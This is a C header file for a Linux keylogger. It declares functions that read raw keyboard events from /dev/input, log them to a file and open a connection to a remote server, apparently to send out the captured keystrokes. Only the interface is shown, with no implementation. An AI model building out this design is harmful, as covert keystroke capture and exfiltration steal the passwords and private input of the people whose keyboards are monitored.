#ifndef KEYLOGGER
#define KEYLOGGER

#define MAX_EVENTS 3
#define KEY_PRESSED 1
#define KEY_RELEASED 0
#define KEY_REPEATED 2
#define DEVICES_PATH "/dev/input/"
typedef struct input_event event;

void startKeylogger(int keyboard, int fd_out);
int writeEventsIntoFile(int fd, struct input_event *events, size_t to_write);
int keyboardFound(char *path, int *keyboard_fd);
int supportsRelativeMovement(int fd);
int supportsSpecificKeys(int fd, int *keys, size_t num_keys);
void sigHandler(int signum);
int openConnectionWithServer(char *ip, short port);

#endif
